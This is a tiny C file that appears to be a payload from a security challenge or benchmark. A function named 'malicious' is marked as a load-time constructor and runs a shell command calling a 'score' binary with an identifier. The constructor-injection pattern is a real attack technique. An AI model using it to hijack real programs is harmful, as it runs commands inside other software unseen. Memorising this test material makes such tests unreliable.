#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 0cdf7c10-59e4-400f-8e86-7beefea82630");
}
